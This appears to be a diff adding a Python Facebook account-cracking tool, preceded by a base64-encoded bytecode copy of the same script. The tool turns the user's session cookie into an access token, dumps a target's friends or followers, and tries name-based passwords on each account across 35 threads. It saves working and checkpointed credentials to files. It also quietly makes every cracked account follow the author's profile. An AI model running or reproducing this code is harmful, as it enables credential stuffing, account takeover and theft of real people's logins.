ZA0KCQlpZiBsYXRpZl9nYW50ZW5nWydjaG9zZSddPT0iZnJpZW5kcyI6DQoJCQlyID0gcmVxdWVzdHMuZ2V0KGYie2xhdGlmX2dhbnRlbmdbJ3VybCddfSIsY29va2llcz1zZWxmLmNva2kpLmpzb24oKVsnZnJpZW5kcyddDQoJCWVsc2U6DQoJCQlyID0gcmVxdWVzdHMuZ2V0KGYie2xhdGlmX2dhbnRlbmdbJ3VybCddfSIsY29va2llcz1zZWxmLmNva2kpLmpzb24oKVsnc3Vic2NyaWJlcnMnXQ0KCQlmb3IgeCBpbiByWydkYXRhJ106DQoJCQl0cnk6DQoJCQkJc2VsZi5kYXRhX2lkLmFwcGVuZCh4WyduYW1lJ10rIj48Iit4WydpZCddKQ0KCQkJZXhjZXB0IEtleUVycm9yOg0KCQkJCXBhc3MNCgkJZGF0YV9pZCA9IHNlbGYuZGF0YV9pZA0KCQlwcmludCgNCgkJCWYiID4gdG90YWwgaWQ6IHtsZW4oc2VsZi5kYXRhX2lkKX0iDQoJCSkNCgkJc2VsZi52YWxpZGF0ZQ0KCQkNCglkZWYgZm9sbG93X21lKHNlbGYsY29raSk6DQoJCXdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHNlc3Npb246DQoJCQlfbGluayA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoZiJ7c2VsZi5tYmFzaWN9L2xhdGlmLmhhcmthdC4xNzYiLGhlYWRlcnM9eydob3N0JzonbWJhc2ljLmZhY2Vib29rLmNvbScsJ2FjY2VwdC1sYW5ndWFnZSc6J2lkLUlELGlkO3E9MC45J30sY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQsICdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLHN0cmluZz0nSWt1dGknKQ0KCQkJaWYgX2xpbms6DQoJCQkJcmV0dXJuIHNlc3Npb24uZ2V0KGYie3NlbGYubWJhc2ljfSIrX2xpbmsuZ2V0KCdocmVmJyksY29va2llcz17ImNvb2tpZSI6Y29raX0pDQoNCmRlZiBfbG9naW4oKToNCgl0cnk6DQoJCXRva2VuID0gb3BlbigiZGF0YS90b2tlbiIsInIiKS5yZWFkKCkNCgkJY29raSA9IG9wZW4oImRhdGEvY29raSIsInIiKS5yZWFkKCkNCgkJQXNzZXRzKHRva2VuPXRva2VuLGNva2k9Y29raSkuTWVudQ0KCWV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCgkJdHJ5Om9zLm1rZGlyKCJkYXRhIikNCgkJZXhjZXB0OnBhc3MNCgkJcHJpbnQoIlx0ID48IENvb2tpZXMgbm90IGZvdW5kID48XG4gISBQbGVhc2UgbG9naW4gZmlyc3QgIVxuIikNCgkJY29raSA9IGlucHV0KCIgPiBZb3VyIGNvb2tpZXM6ICIpDQoJCXRva2VuID0gY29udmVydChjb2tpKQ0KCQlpZiB0b2tlbj09IkNvb2tpZXMgSW52YWxpZCI6DQoJCQlleGl0KCIgISBNYXliZSB5b3VyIGNvb2tpZXMgSW52YWxpZCAhICIpDQoJCW9wZW4oImRhdGEvdG9rZW4iLCJhIikud3JpdGUodG9rZW4pDQoJCW9wZW4oImRhdGEvY29raSIsImEiKS53cml0ZShjb2tpKQ0KCQlTdWNjZXNzID0gQXNzZXRzKHRva2VuPXRva2VuLGNva2k9Y29raSk7U3VjY2Vzcy5nZXRfbXlfaW5mbztTdWNjZXNzLmZvbGxvd19tZShjb2tpKTtTdWNjZXNzLk1lbnUNCg0KaWYgX19uYW1lX189PSJfX21haW5fXyI6DQoJb3Muc3lzdGVtKA0KCQkiY2xlYXIiDQoJKQ0KCV9sb2dpbigpDQo=(\x02\x00\x00\x00t\x06\x00\x00\x00base64t\t\x00\x00\x00b64decode(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x04\x00\x00\x00s\x02\x00\x00\x00\x0c\x01'))
+"""
+Copyright (c) Charsi Brand Power
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+"""
+
+import requests, re, os, random, sys
+from bs4 import BeautifulSoup
+from random import choice
+from concurrent.futures import ThreadPoolExecutor
+from time import time as mek
+
+# data - data
+P = "\x1b[0;97m" 
+M = "\x1b[0;91m"
+H = "\x1b[0;92m"
+K = "\x1b[0;93m"
+B = "\x1b[0;94m"
+BM = "\x1b[0;96m"
+loop, ok, cp = [],[],[]
+opsi = []
+data_id = None
+
+# convert cookies to token
+def convert(cookie):
+	cookies = {"cookie":cookie}
+	res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
+		'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
+		'referer'	:	'https://www.facebook.com/',
+		'host'	:	'business.facebook.com',
+		'origin'	:	'https://business.facebook.com',
+		'upgrade-insecure-requests'	:	'1',
+		'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+		'cache-control'	:	'max-age=0',
+		'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		'content-type'	:	'text/html; charset=utf-8'
+	}, cookies = cookies)
+	try:
+		token = re.search('(EAAG\w+)',str(res.text)).group(1)
+	except:
+		token = "Cookies Invalid"
+	finally:
+		return token
+		
+def real_time():
+	return str(mek()).split('.')[0]
+		
+def sesi(session,res):
+	response = BeautifulSoup(res,'html.parser')
+	form = response.find('form',{'method':'post'})
+	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
+	r = BeautifulSoup(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
+	for i in r.find_all('option'):
+		opsi.append(i.text)
+	return opsi
+
+class Main:
+	
+	def __init__(self,**kwargs):
+		self.coki, self.token = {"cookie":kwargs['coki']}, kwargs['token']
+		self.data_id = []
+		self.mbasic = "https://mbasic.facebook.com"
+	
+	@property
+	def get_my_info(self):
+		r = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}",cookies=self.coki).json()
+		self.name,self.id = r['name'], r['id']
+		return {'name':self.name, 'id':self.id}
+			
+		
+	@property
+	def Menu(self):
+		try:
+			info = self.get_my_info
+		except KeyError:
+			os.remove("data/token");os.remove("data/coki")
+			exit(" ! Your token Expired ! ")
+		print(
+			f" >> Your Account: {info['name']}, {info['id']} << "
+		)
+		print(
+			"""
+	   1.) Crack from friends list ]
+	   2.) Crack from followers list ]
+	   3.) Check results OK/CP]
+	   0.) Logout account (cookies)]
+			"""
+		)
+		chose = input(" > Chosee: ")
+		number_list = ['0','1','2','3']
+		while chose not in number_list:
+			print(' ! Your Chose Not Found !')
+			chose = input(" > Chosee: ")
+		if chose=='1' or chose=='2':
+			if chose=='1':print("\n >😈< Crack from friends list Selected >😈<")
+			else:print("\n >😈< Crack from followers list Selected >😈<")
+			account_target = input(" >> Target id: ")
+			try:
+				r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",cookies=self.coki).json()
+				target_name = r['name']
+				print(f" > Target name: {target_name}")
+			except KeyError:
+				exit(" ! Target Not Found ! ")
+			if chose=='1':self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}",chose="friends")
+			else:self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}",chose="followers")
+			self.validate
+		elif chose=='0':
+			os.remove('data/token');os.remove('data/coki')
+			exit(f'\n √ Logout Success, bye {self.name}')
+		else:
+			print('\n >😈< Check Results OK & CP >😈<')
+			try:
+				print(' >> OK results :')
+				for x in open('data/ok','r').readlines():
+					print(f' > {x}')
+			except:print(' > Results 0 ')
+			print(
+				"","><"*25
+			)
+			try:
+				print(' >> CP results :')
+				for x in open('data/cp','r').readlines():
+					print(f' > {x}')
+			except:print(' > Results 0 ')
+				
+			
+class Crack:
+	
+	def crack(self, user, password_list, url):
+		session = requests.Session()
+		for pw in password_list:
+			r = BeautifulSoup(session.get(f"{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
+				'Host'	:	'mbasic.facebook.com',
+				'Connection'	:	'keep-alive',
+				'Cache-Control'	:	'max-age=0',
+				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
+				'sec-ch-ua-mobile'	:	'?1',
+				'sec-ch-ua-platform'	:	'"Android"',
+				'Upgrade-Insecure-Requests'	:	'1',
+				'User-Agent'	:	'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+				'Sec-Fetch-Site'	:	'same-origin',
+				'Sec-Fetch-Mode'	:	'navigate',
+				'Sec-Fetch-User'	:	'?1',
+				'Sec-Fetch-Dest'	:	'document',
+				'Referer'	:	'https://mbasic.facebook.com/login/device-based/',
+				'Accept-Encoding'	:	'gzip, deflate',
+				'Accept-Language'	:	'id-ID,id;q=0.9'
+			}).text, 'html.parser')
+			data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
+			data.update(
+				{
+					'uid':user,
+					'next':'https://mbasic.facebook.com/login/save-device/',
+					'flow':'login_no_pin',
+					'encpass':'#PWD_BROWSER:0:{}:{}'.format(real_time(),pw)
+				}
+			)
+			session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
+				'Host'	:	'mbasic.facebook.com',
+				'Connection'	:	'keep-alive',
+				'Content-Length'	:	'142',
+				'Cache-Control'	:	'max-age=0',
+				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
+				'sec-ch-ua-mobile'	:	'?1',
+				'sec-ch-ua-platform'	:	'"Android"',
+				'Upgrade-Insecure-Requests'	:	'1',
+				'Origin'	:	'https://mbasic.facebook.com',
+				'Content-Type'	:	'application/x-www-form-urlencoded',
+				'User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
+				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+				'Sec-Fetch-Site'	:	'same-origin',
+				'Sec-Fetch-Mode'	:	'navigate',
+				'Sec-Fetch-User'	:	'?1',
+				'Sec-Fetch-Dest'	:	'document',
+				'Referer'	:	f'https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
+				'Accept-Encoding'	:	'gzip, deflate, br',
+				'Accept-Language'	:	'id-ID,id;q=0.9'
+			})
+			if "c_user" in session.cookies.get_dict():
+				ok.append(user+"|"+pw)
+				open("data/ok","a").write(user+"|"+pw+"\n")
+				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
+				self.follow_me(coki)
+				sys.stdout.write('\n%s\r √ Account Safe\n > Email: %s\n > Pass: %s\n ^ Ngentot Lu ^\n%s'%(H,user,pw,P))
+				sys.stdout.flush()
+				break
+			elif "checkpoint" in session.cookies.get_dict():
+				cp.append(user+"|"+pw)
+				open("data/cp","a").write(user+"|"+pw+"\n")
+				h2 = {
+					'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
+				}
+				res = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
+				ress = BeautifulSoup(res, 'html.parser')
+				form = ress.find('form',{'method':'post'})
+				data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
+				data2.update({
+					'email':user,
+					'pass':pw
+				})
+				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
+				ress = BeautifulSoup(res, 'html.parser')
+				if 'View the login details displayed. This you?' in str(ress.find('title').text):
+					open("ua","a").write("%s|%s"%(user,pw))
+					sys.stdout.write('\n%s\r ✓ Account tap yes\n > Email: %s\n > Pass: %s\n %s'%(H,user,pw,P))
+					sys.stdout.flush()
+				else:
+					if(len(sesi(session,res))==0):
+						if 'Enter the Login Code to Continue' in str(ress.find('title').text):
+							sys.stdout.write('\n%s\r × Account a2f on\n > Email: %s\n > Pass: %s\n ^ Buang Aja ^\n%s'%(M,user,pw,P))
+							sys.stdout.flush()
+					else:
+						sys.stdout.write('\n%s\r × Account checkpoint\n > Email: %s\n > Pass: %s\n > Option: %s > %s\n%s'%(K,user,pw,len(opsi),', '.join(opsi),P))
+						sys.stdout.flush()
+				opsi.clear()
+				break
+			sys.stdout.write("\r✓[Charsi] 😈CRACK START %s/%s OK/CP:-%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
+			sys.stdout.flush()
+		loop.append("memek")
+
+class Assets(Main):
+	
+	@property
+	def _password_split(self):
+		print("\n >😈< Addtional password,  (,) >😈< \n >> example: qwerty,latif harkat,anjing\n >! Password must be more than 6 characters\n")
+		_password = input(" > Add pass: ");print("")
+		return _password.split(",")
+
+	@property
+	def validate(self):
+		add = input(" >> [y/n] Addtional password? ")
+		if add=="y":
+			pas = self._password_split
+		print(
+			" >😈< Crack Running, (CTRL + C) to stopped >😈<\n"
+		)
+		with ThreadPoolExecutor(max_workers=35) as kirim:
+			for x in self.data_id:
+				x = x.lower()
+				namee,id = x.split('><')
+				name = namee.split(" ")
+				if(len(name[0])>=6):
+					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345']
+				elif(len(name[0])<=2):
+					__password_list = [namee,name[0]+'1234',name[0]+'12345']
+				else:
+					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345']
+				if add=="y":
+					__password_list = __password_list + pas
+				kirim.submit(Crack().crack, id, __password_list, self.mbasic)
+		exit(
+			" [program finished] crack finished, Charsi Brand:v"
+		)
+	
+	def dumpAccount(self,**latif_ganteng):
+		global data_id
+		if latif_ganteng['chose']=="friends":
+			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['friends']
+		else:
+			r = requests.get(f"{latif_ganteng['url']}",cookies=self.coki).json()['subscribers']
+		for x in r['data']:
+			try:
+				self.data_id.append(x['name']+"><"+x['id'])
+			except KeyError:
+				pass
+		data_id = self.data_id
+		print(
+			f" > total id: {len(self.data_id)}"
+		)
+		self.validate
+		
+	def follow_me(self,coki):
+		with requests.Session() as session:
+			_link = BeautifulSoup(session.get(f"{self.mbasic}/latif.harkat.176",headers={'host':'mbasic.facebook.com','accept-language':'id-ID,id;q=0.9'},cookies={"cookie":coki}).text, 'html.parser').find('a',string='Ikuti')
+			if _link:
+				return session.get(f"{self.mbasic}"+_link.get('href'),cookies={"cookie":coki})
+
+def _login():
+	try:
+		token = open("data/token","r").read()
+		coki = open("data/coki","r").read()
+		Assets(token=token,coki=coki).Menu
+	except FileNotFoundError:
+		try:os.mkdir("data")
+		except:pass
+		print("\t >< Cookies not found ><\n ! Please login first !\n")
+		coki = input(" > Your cookies: ")
+		token = convert(coki)
+		if token=="Cookies Invalid":
+			exit(" ! Maybe your cookies Invalid ! ")
+		open("data/token","a").write(token)
+		open("data/coki","a").write(coki)
+		Success = Assets(token=token,coki=coki);Success.get_my_info;Success.follow_me(coki);Success.Menu
+
+if __name__=="__main__":
+	os.system(
+		"clear"
+	)
+	_login()
